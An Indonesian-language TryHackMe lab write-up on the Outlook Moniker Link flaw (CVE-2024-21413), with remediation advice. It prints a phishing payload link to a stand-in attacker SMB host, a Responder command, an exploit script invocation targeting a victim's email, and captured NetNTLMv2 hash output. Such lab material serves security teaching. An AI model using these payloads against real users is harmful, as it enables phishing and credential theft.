# Moniker Link (CVE-2024-21413)

---

*   **Room Link:** [Moniker Link](https://tryhackme.com/r/room/monikerlink)
*   **Category:** Exploitation Basics
*   **Difficulty:** Medium

---

## Task 1: Introduction

Room ini membahas kerentanan kritis pada Microsoft Outlook yang dikenal sebagai **Moniker Link** (CVE-2024-21413).

**Poin Utama:**
*   **CVE-2024-21413:** Ditemukan oleh Check Point Research (Haifei Li), dipublikasikan Februari 2024.
*   **Impact:**
    *   **Bypass Protected View:** Outlook biasanya memblokir link berbahaya atau membukanya di mode aman (Protected View Area), tapi celah ini mem-bypass fitur tersebut.
    *   **Credential Leakage:** Penyerang bisa mencuri kredensial NTLM user (NetNTLMv2 hash).
    *   **RCE (Remote Code Execution):** Potensi eksekusi kode jarak jauh.
*   **Severity:** CVSS 9.8 (Critical).

---

## Task 2: Moniker Link (CVE-2024-21413)

Task ini menjelaskan cara kerja vulnerability Moniker Link.

**1. Konsep Moniker Link**
Outlook menggunakan "Moniker Link" untuk memproses protokol tertentu. Biasanya, protokol `http://` atau `https://` akan membuka browser. Namun, protokol seperti `file://` mencoba mengakses resource lokal atau network share (SMB).

**2. Mekanisme Serangan**
*   **Normal:** Jika kita kirim link `file://ATTACKER_IP/share`, Outlook akan curiga dan menampilkan warning security.
*   **Bypass:** Dengan menambahkan tanda seru (`!`) dan karakter random di belakang ekstensi file, kita bisa menipu Outlook.
    *   *Payload:* `file://ATTACKER_IP/test!exploit`
    *   Outlook gagal memvalidasi link ini sebagai berbahaya dan mencoba mengaksesnya *tanpa* warning dan *tanpa* Protected View.

**3. Dampak (Credential Thef)**
Saat Outlook mencoba mengakses path SMB (`\\ATTACKER_IP\test`), Windows secara otomatis akan mencoba melakukan autentikasi (Single Sign-On).
*   Akibatnya: Windows mengirimkan **NetNTLMv2 Hash** user ke mesin penyerang.
*   Penyerang bisa menangkap hash ini menggunakan tool seperti **Responder**.

**4. Versi Terdampak**
*   Microsoft Office LTSC 2021
*   Office 2019
*   Office 2016
*   Office 365 (Enterprise)
*   (Sudah dipatch per Patch Tuesday Februari 2024)

---

## Task 3: Exploitation

Task ini mempraktekkan serangan untuk mencuri NTLM Hash user.

**1. Skenario**
Kita berperan sebagai penyerang yang mengirim email phishing berisi link berbahaya ke korban (Outlook user). Tujuannya adalah menangkap hash password mereka.

**2. Persiapan (Attacker Machine)**
*   **Responder:** Tool untuk memalsukan service SMB/LLMNR dan menangkap hash autentikasi.
    *   Command: `sudo responder -I tun0`
    *   (Pastikan pakai interface VPN `tun0` atau `eth0` sesuai koneksi TryHackMe).

**3. Mengirim Payload**
Kita menggunakan script Python (biasanya disediakan di mesin attacker, misal `exploit.py` atau `poc.py`) untuk mengirim email SMTP.

*   **Payload Moniker Link:**
    ```html
    <a href="file://ATTACKER_IP/imnotreal!exploit">Click me</a>
    ```
    *Note: Bagian `!exploit` adalah kunci bypass-nya.*

*   **Menjalankan Exploit:**
    ```bash
    python3 exploit.py --target [EMAIL_KORBAN] --host [SMTP_SERVER] --attacker [ATTACKER_IP]
    ```

**4. Hasil (Capture Hash)**
1.  Korban membuka email dan mengklik link (walaupun linknya aneh, Outlook tertipu untuk mencoba koneksi SMB).
2.  Di terminal **Responder**, akan muncul **NetNTLMv2 Hash** milik korban.
    ```
    [SMB] NTLMv2-SSP Hash     : Admin::M57...
    ```
3.  Copy hash tersebut untuk di-crack nanti.

---

## Task 4: Remediation

Bagaimana cara mencegah serangan ini?

**1. Patching (Paling Utama)**
Microsoft sudah merilis patch untuk CVE-2024-21413 pada **Februari 2024**.
*   Segera update Microsoft Office / Outlook ke versi terbaru.
*   Cek update via Windows Update atau Microsoft Update Catalog.

**2. Konfigurasi Firewall**
Blokir trafik SMB (port 445) keluar (outbound) dari jaringan user ke internet. Ini akan mencegah Windows mengirimkan hash NTLM ke server penyerang di luar jaringan.

**3. User Awareness**
*   Jangan asal klik link dari email tidak dikenal.
*   Perhatikan link yang mencurigakan (walaupun fitur *hover* di Outlook mungkin tidak selalu menampilkan bentuk asli Moniker Link yang sudah dimodifikasi).

---

## Task 5: Conclusion

Vulnerability Moniker Link (CVE-2024-21413) mengajarkan kita bahwa:
1.  Fitur keamanan seperti "Protected View" bisa di-bypass dengan manipulasi protokol link (`file://` + `!`).
2.  Dampaknya sangat kritis (CVSS 9.8) karena bisa mencuri kredensial user tanpa interaksi yang rumit (cuma klik link).
3.  Selalu update software (Patch Tuesday) adalah pertahanan terbaik.

**Room Completed!** ðŸŽ‰


